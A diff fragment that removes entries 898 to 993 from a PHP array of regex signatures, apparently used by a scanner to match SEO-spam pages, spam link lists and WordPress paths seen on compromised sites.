-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    898 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/metalloplastic\\.com\\.ua\\/5feke\\/60\\-day\\-transformation\\-reddit\\.html\\>tg\\<\\/a\\>, \\<a href\\=http\\:\\/\\/smartdeal\\.lv\\/rawrb4rn\\/windows\\-10\\-inacces/',
-      'label' => 'source-file tail snippet',
-    ),
-    899 => 
-    array (
-      'pattern' => '/\\/drivers\\/input\\/touchscreen\\/mediatek\\/gslX68X\\/mtk/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    900 => 
-    array (
-      'pattern' => '/\\>Decorative screen panels indoor\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    901 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/platovietnam\\.com\\.vn\\/wp\\-content\\/themes\\/guava\\/4xa\\/antenna\\-analyzer\\-schematic\\.html\\>bg\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.shishangta\\.cn\\/ytot/',
-      'label' => 'source-file tail snippet',
-    ),
-    902 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  \\<title\\>Rabbitmq password special characters\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    903 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Aeotec multisensor 6 isy\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    904 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>12 channel car amplifier\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    905 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/yeganehweb\\.ir\\/trc\\/animal\\-crossing\\-creepy\\-music\\.html\\>cc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.pc01010\\.com\\/2ozmd\\/vyprvpn\\-app\\-store\\.html\\>99\\<\\/a/',
-      'label' => 'source-file tail snippet',
-    ),
-    906 => 
-    array (
-      'pattern' => '/\\>Zusette deleon\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    907 => 
-    array (
-      'pattern' => '/content\\/themes\\/consultx\\/6gvnfi\\/touchosc/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    908 => 
-    array (
-      'pattern' => '/content\\/plugins\\/akismet\\/views\\/kuuu5g\\/sg/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    909 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Clothes rail\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    910 => 
-    array (
-      'pattern' => '/content\\/themes\\/consultx\\/6gvnfi\\/corsair/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    911 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Ps4 media player controls\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    912 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/jimo\\.ga\\/lze8pkgh\\/wmic\\-commands\\-in\\-sccm\\.html\\>xc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/hotelcampoverde\\.com\\.br\\/2ka\\/xcode\\-not\\-updating\\-to\\-10\\.html\\>4/',
-      'label' => 'source-file tail snippet',
-    ),
-    913 => 
-    array (
-      'pattern' => '/\\>Johns hopkins white marsh breast center\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    914 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/loseweightfitnesstips\\.com\\/2yqb2t\\/agile\\-rally\\-dev\\.html\\>bb\\<\\/a\\>, \\<a href\\=http\\:\\/\\/billiard1\\.ir\\/lbxl0xrf\\/fortnite\\-stats\\-bot\\-discord/',
-      'label' => 'source-file tail snippet',
-    ),
-    915 => 
-    array (
-      'pattern' => '/\\>V8 detroit diesel sound\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    916 => 
-    array (
-      'pattern' => '/\\$?teamfortress2xreader\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    917 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/0qv87cq\\/whatsapp/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    918 => 
-    array (
-      'pattern' => '/_mms\\|myx\\|a700\\|gu1100\\|bc831\\|e300\\|ems100\\|me701\\|me702m\\-three\\|sd588\\|[\\s\\S]{0,160}d736\\|p\\-9521\\|telco\\|sl74\\|ktouch\\|m4u\\\\\\/\\|me702\\|8325rc\\|kddi\\|phone\\|lg \\|/',
-      'label' => 'sample-specific literal chain',
-    ),
-    919 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/fanamaran\\.ir\\/e5kl\\/how\\-to\\-use\\-netbeans\\-connector\\.html\\>io\\<\\/a\\>, \\<a href\\=http\\:\\/\\/palargroup\\.com\\/nrc8xbb2\\/iprimus\\-modem\\-lights\\.html/',
-      'label' => 'source-file tail snippet',
-    ),
-    920 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.savaniphotography\\.co\\.uk\\/r8nlsl\\/gemma\\-o\\-doherty\\-terenure\\-college\\.html\\>uo\\<\\/a\\>, \\<a href\\=http\\:\\/\\/marginaltrading\\.com\\/nlfg\\/2mm\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    921 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.bikegaragemission\\.shop\\/biw\\/circular\\-bold\\-std\\.html\\>dc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/tresusa\\.biz\\/nly0mls\\/welcome\\-address\\-to\\-new\\-batch/',
-      'label' => 'source-file tail snippet',
-    ),
-    922 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/best\\-scuba\\-diving\\-vacations\\-in\\-british\\-columbia\\.com\\/nasnqcq\\/mandelin\\-test\\-kit\\-amazon\\.html\\>id\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.brvfurni/',
-      'label' => 'source-file tail snippet',
-    ),
-    923 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  \\<title\\>Land cruiser 200 suspension\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    924 => 
-    array (
-      'pattern' => '/true"\\>Pvs write cache\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    925 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/test\\.mobyte\\.es\\/raooe\\/what\\-is\\-content\\-browser\\.html\\>rt\\<\\/a\\>, \\<a href\\=http\\:\\/\\/jasawebsite\\.promo\\/iuj\\/moombahton\\-bootleg\\-pack\\.html\\>j/',
-      'label' => 'source-file tail snippet',
-    ),
-    926 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/mpharmaday\\.com\\/ikrecnm\\/coolsculpting\\-lipoma\\.html\\>eb\\<\\/a\\>, \\<a href\\=http\\:\\/\\/topdetail\\.cz\\/ten\\/nadeem\\-sarwar\\-2019\\.html\\>ag\\<\\/a\\>, \\<a h/',
-      'label' => 'source-file tail snippet',
-    ),
-    927 => 
-    array (
-      'pattern' => '/content\\/themes\\/consultx\\/6gvnfi\\/tom/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    928 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Cpt 25575\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    929 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Libxml2 xpath\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    930 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/apohair\\.com\\/euwt\\/power\\-bi\\-map\\-custom\\-visual\\.html\\>4a\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.commercial\\.ba\\/sze3tyhg\\/a4\\-player\\-app\\.html\\>mk\\<\\/a\\>,/',
-      'label' => 'source-file tail snippet',
-    ),
-    931 => 
-    array (
-      'pattern' => '/\\$?out_folder_path\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    932 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/careers\\.napconational\\.com\\/wp\\-content\\/plugins\\/wordpress\\-seo\\/admin\\/formatter\\/t0qqj6\\/bnha\\-bakugou\\-x\\-jealous\\-reader\\.html\\>lt\\<\\/a\\>, /',
-      'label' => 'source-file tail snippet',
-    ),
-    933 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/v2\\.hanoifreelocaltours\\.com\\/eitagc\\/flash\\-5770\\-mac\\.html\\>w2\\<\\/a\\>, \\<a href\\=http\\:\\/\\/outdoor\\-ficken\\.com\\/5mra\\/yolov3\\-weights\\.html\\>id\\<\\//',
-      'label' => 'source-file tail snippet',
-    ),
-    934 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/privati\\.es\\/gq6u\\/dating\\-whatsapp\\-group\\-links\\.html\\>n7\\<\\/a\\>, \\<a href\\=http\\:\\/\\/wp\\-cms\\.ir\\/osrqqb\\/azure\\-firewall\\-snat\\.html\\>34\\<\\/a\\>, \\<a /',
-      'label' => 'source-file tail snippet',
-    ),
-    935 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Add money to riversweeps\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    936 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/calbro\\.ru\\/rusij5\\/gfortran\\-download\\.html\\>te\\<\\/a\\>, \\<a href\\=http\\:\\/\\/sitepal\\.ir\\/v1vr\\/mkvtoolnix\\-portable\\.html\\>vn\\<\\/a\\>, \\<a href\\=http\\:/',
-      'label' => 'source-file tail snippet',
-    ),
-    937 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Computer audiophile setup\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    938 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/mn8mnt\\/correctional/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    939 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  \\<title\\>Permanent residence provincial nominee processing time\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    940 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/brideideas\\.space\\/87qw\\/ssg\\-board\\-situational\\-questions\\.html\\>kw\\<\\/a\\>, \\<a href\\=http\\:\\/\\/saluguia\\.com\\.ar\\/y2zuw\\/forming\\-meaning\\-in\\-te/',
-      'label' => 'source-file tail snippet',
-    ),
-    941 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Gdpr web scraping\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    942 => 
-    array (
-      'pattern' => '/\\>Pyside2 download wheel\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    943 => 
-    array (
-      'pattern' => '/true"\\>Cinema hd for iphone\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    944 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.myopentip\\.com\\/xrlf\\/mythicmobs\\-config\\.html\\>07\\<\\/a\\>, \\<a href\\=http\\:\\/\\/express\\-povar\\.ru\\/4ve4nq\\/gta\\-5\\-online\\-money\\-cheats\\.html\\>m/',
-      'label' => 'source-file tail snippet',
-    ),
-    945 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/verkol\\.ir\\/v1pr7pf45\\/mac\\-legacy\\-image\\-should\\-be\\-converted\\-mojave\\.html\\>qc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/fortune\\.icreativelabs\\.com\\/qwan\\/be/',
-      'label' => 'source-file tail snippet',
-    ),
-    946 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.vapebartender\\.com\\/wkssbj\\/murrieta\\-fire\\-map\\.html\\>av\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.banxue\\.org\\/ebp\\/positively\\-wendy\\-bell\\-palace\\-th/',
-      'label' => 'source-file tail snippet',
-    ),
-    947 => 
-    array (
-      'pattern' => '/\\>\\<span\\>Apartments for rent\\<\\/span\\>\\<\\/span\\>\\<\\/li\\>
-
-              \\<li\\>\\<span class\\=[\\s\\S]{0,160}\\>\\<span\\>All rental listings\\<\\/span\\>\\<\\/span\\>\\<\\/li\\>
-
-              \\<li\\>\\<span class\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    948 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/thebrandhawks\\.com\\/mck\\/dell\\-optiplex\\-390\\-second\\-hard\\-drive\\.html\\>9i\\<\\/a\\>, \\<a href\\=http\\:\\/\\/mehdisabri\\.com\\/s73dw\\/monsta\\-x\\-reaction\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    949 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/dehkadefilm\\.ir\\/v8mqaptffm\\/pdftomusic\\-pro\\.html\\>b0\\<\\/a\\>, \\<a href\\=http\\:\\/\\/downloadhd\\.xyz\\/8tny0\\/zimperium\\-careers\\.html\\>54\\<\\/a\\>, \\<a h/',
-      'label' => 'source-file tail snippet',
-    ),
-    950 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Time dragon 5e\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    951 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/wjilu\\.com\\/fro\\/apotheosis\\-novel\\-english\\.html\\>2i\\<\\/a\\>, \\<a href\\=http\\:\\/\\/upstreamperipheral\\.com\\/x3jjcsktn\\/bing\\-maps\\-status\\.html\\>8j\\</',
-      'label' => 'source-file tail snippet',
-    ),
-    952 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/xjgiqey\\/design/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    953 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Odoo runbot setup\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    954 => 
-    array (
-      'pattern' => '/\\>Pueo oc1\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    955 => 
-    array (
-      'pattern' => '/content\\/plugins\\/akismet\\/views\\/kuuu5g\\/call/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    956 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Osrs hotkeys\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    957 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/lig9t\\/ab/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    958 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Javascript socket\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    959 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/shrujais\\.com\\/wordpress\\/wp\\-content\\/themes\\/guava\\/dropyic\\/saybolt\\-viscosity\\-conversion\\.html\\>as\\<\\/a\\>, \\<a href\\=http\\:\\/\\/topdetail\\.cz\\//',
-      'label' => 'source-file tail snippet',
-    ),
-    960 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.stachelhaus\\.info\\/yeg12v\\/lsl\\-listen\\-to\\-chat\\.html\\>sh\\<\\/a\\>, \\<a href\\=http\\:\\/\\/xbody\\-active\\.com\\/asfjmbhd\\/pearson\\-method\\-of\\-moment/',
-      'label' => 'source-file tail snippet',
-    ),
-    961 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Mobilogy touch 2\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    962 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/cgeqx\\/how/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    963 => 
-    array (
-      'pattern' => '/\\>Github kitty\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    964 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Divi username and api key free\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    965 => 
-    array (
-      'pattern' => '/content\\/themes\\/guava\\/dropyic\\/sundance/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    966 => 
-    array (
-      'pattern' => '/\\>Google pixel keyboard settings\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    967 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/ruvelservices\\.com\\/00qt\\/bengali\\-wedding\\-tatta\\-list\\.html\\>ld\\<\\/a\\>, \\<a href\\=http\\:\\/\\/tienluat\\.com\\.vn\\/cj08\\/2003\\-silverado\\-cranks\\-but\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    968 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Adobe rush apk for android\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    969 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/navellier\\.com\\/wp\\-content\\/themes\\/guava\\/vqle\\/pvc\\-pipe\\-size\\-chart\\.html\\>hy\\<\\/a\\>, \\<a href\\=http\\:\\/\\/lalucozyrooms\\.com\\/fwpvjyj43\\/i5\\-825/',
-      'label' => 'source-file tail snippet',
-    ),
-    970 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/denizisisag\\.com\\/zzhrhooa\\/cdr\\-viewer\\-app\\.html\\>6p\\<\\/a\\>, \\<a href\\=http\\:\\/\\/cbdprom\\.com\\/cfuxx\\/bugcheckcode\\-239\\.html\\>sq\\<\\/a\\>, \\<a href\\=h/',
-      'label' => 'source-file tail snippet',
-    ),
-    971 => 
-    array (
-      'pattern' => '/\\$?nSunsrecommendations\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    972 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/topkomment\\.com\\/xaq1qg\\/hits\\-1\\-songs\\-2019\\.html\\>uw\\<\\/a\\>, \\<a href\\=http\\:\\/\\/khakshah\\.in\\/vivng\\/it\\-roars\\-sheet\\-music\\.html\\>xi\\<\\/a\\>, \\<a hr/',
-      'label' => 'source-file tail snippet',
-    ),
-    973 => 
-    array (
-      'pattern' => '/true"\\>Technology guest post guidelines\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    974 => 
-    array (
-      'pattern' => '/\\$?UpdateFirmwareAndroid_withiOS_2_ymL5srw\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    975 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/mn8mnt\\/elastic/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    976 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.dunyamantar\\.com\\/kkm\\/62\\-bat\\-turn\\.html\\>os\\<\\/a\\>, \\<a href\\=http\\:\\/\\/test\\.mobyte\\.es\\/raooe\\/corruption\\-of\\-champions\\-mod\\-image\\-pack\\-a/',
-      'label' => 'source-file tail snippet',
-    ),
-    977 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Nava maratha newspaper ahmednagar today\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    978 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/scholar2020\\.space\\/vgigq\\/recruitment\\-matrix\\-template\\-format\\.html\\>hk\\<\\/a\\>, \\<a href\\=http\\:\\/\\/augur\\.com\\.au\\/j8ox\\/latest\\+\\-agesa\\.html\\>d/',
-      'label' => 'source-file tail snippet',
-    ),
-    979 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  \\<title\\>Where to find geodes in colorado\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    980 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>I2s tutorial\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    981 => 
-    array (
-      'pattern' => '/\\>Mercedes e400 tune\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    982 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Cube 3d cartridge hack\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    983 => 
-    array (
-      'pattern' => '/true"\\>Index of the mist\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    984 => 
-    array (
-      'pattern' => '/\\$?Porcupine28\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    985 => 
-    array (
-      'pattern' => '/true"\\>North korea server\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    986 => 
-    array (
-      'pattern' => '/Marshall county daily obituaries/',
-      'label' => 'sample-specific literal',
-    ),
-    987 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/dunlopillo\\.firstcom\\.vn\\/znvoqelq\\/bimbo\\-bread\\.html\\>s5\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.k4dassociates\\.com\\/7twe\\/what\\-is\\-activity\\-in\\-androi/',
-      'label' => 'source-file tail snippet',
-    ),
-    988 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Curriculum calendar template\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    989 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Trade school vs college reddit\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    990 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Omid royal reporter\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    991 => 
-    array (
-      'pattern' => '/\\>3d brooklyn instagram\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    992 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Coyote mix\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    993 => 
-    array (
